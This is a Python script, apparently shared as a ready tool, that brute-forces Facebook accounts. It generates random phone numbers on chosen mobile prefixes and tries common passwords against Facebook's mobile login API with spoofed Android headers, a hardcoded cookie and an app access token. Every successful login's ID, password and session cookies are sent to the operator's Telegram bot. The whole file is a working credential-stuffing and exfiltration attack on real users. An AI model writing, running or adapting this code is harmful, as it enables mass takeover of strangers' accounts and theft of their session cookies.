#==[MODULE]==#
import os, sys, requests, random, json, time, uuid
from concurrent.futures import ThreadPoolExecutor as r
from datetime import datetime

#==[CONFIG]==#
aaa = ["a", "b"]
id, ok, cp, loop = [], 0, 0, 0


user_tok = ""
user_id = ""
headers = {
  'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX3081;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2242};FB_FW/1;]",
  'Accept-Encoding': "gzip",
  'content-type': "application/json;charset=utf-8",
  'Cookie': "datr=B-qpaufR6pqEfLtrK7LlSjMB; fr=0sxVNu8xlrTSB3SHV..BqqeoH..AAA.0.0.BqqeoH.AWf3QewB8HeWFh245pmiPCTNB54"
}
 

#==[LOGO]==#
Logo = f"""
\033[0;31m\033[1m⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉       

\033[1;35m\031 Zeus~  @R7_36
{'-'*45}"""

#==[TELEGRAM SEND]==#
def tg_send(msg, tok, cid):
    try:
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", 
                     data={"chat_id": cid, "text": msg}, timeout=10)
    except:
        pass

#==[MENU]==#
def menu():
    global user_tok, user_id
    
    os.system('clear')
    print(Logo)
    
    
    user_tok = input(f'\033[1;36mTOKEN: \033[2;31m')
    user_id = input(f'\033[2;35mID: \033[1;31m')
    
    print(f'\033[1;31m 0750 0770 0780 ')
    sim = input(f'\033[1;31m\033[1mChoose: ')
    
    for _ in range(44444):  
        nmp = "".join(random.choice('123456789') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        os.system('clear')
        print(Logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
                ids,
                str(idx),
                "hama1234",
                "zaxo1234",
                "zaxozaxo",
                "kurd1234",
                "muhamad123",
                "kurdkurd",
                'ow9uz8h13'
                'iwoih351335'
                '123456789'
                '123456'
                '12345678'
                'abc123'
                'password'
                'admin'
                'welcome'
                'welcome'
                'monkey'
                '1234567'
                'admin'
                'iloveyou'
                'abc123'
                '123456789'
                '12345678'
                '123456'
                'princess'
                'iloveyou'
              '1234'
             '121212'
        'hello'
        'whatever'
        'abc123'
        'qwerty123'
        'welcome'
        'login'
        'passw0rd'
        'baseball'
         '123456789'
'123456'
'12345678'
'1234567'
'abc123'
'1q2w3e4r'
  'iloveyou'         
'admin'
'welcome'
'121212'
 '696969'
' zaxozaxo','kurd1234','١٢٣٤٥٦٧٨٩','hama1234','١٢٣٤٥٦','zaxozaxozaxi','zaxo12345','١٢٣٤٥٦٧٨','١٢٣٤٥٦٧' ]
            am.submit(crackfree, ids, pwxs)
    
    exit()

def crackfree(ids, pwxs):
    global ok, cp, loop
    sys.stdout.write(f'\r\r\r\033[1;35m\033[1m[R7_36] [OK:-\033[2;32m\033[1m{ok}\033[1;36m\033[1m] [CP:-\033[2;31m{cp}\033[1;31m\036[M5] [{loop}] ')
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()      
            
            if 'session_key' in req:
                uid = req["uid"]
                coki = ';'.join(i['name']+'='+i['value'] for i in req['session_cookies'])
                ok += 1
                
                print(f"\r\r\033[0;32m\033[1m[@R7_36-OK] {uid} | {pw}   ")
                
                user_msg = f"""<><><><><><><><><><><>
OK 

UID: {uid}
Pass: {pw}
Cookie: {coki}

<><><><><><><><><><><>
by @R7_36"""
                
                tg_send(user_msg, user_tok, user_id)
                break
                
            elif 'www.facebook.com' in req["error"]["message"]:
                uid = req["error"]["error_data"]["uid"]
                cp += 1
                
                print(f"\r\r\x1b[38;5;203m\033[1m[@R7_36-CP]\037[0;31m\033[1m {uid} | {pw}   ")
                
                user_msg = f"""<><><><><><><><><><><>
CP 

UID: {uid}
Pass: {pw}

<><><><><><><><><><><>
by @R7_36"""
                
                tg_send(user_msg, user_tok, user_id)
                break
            else:
                pass
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            pass
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

menu()
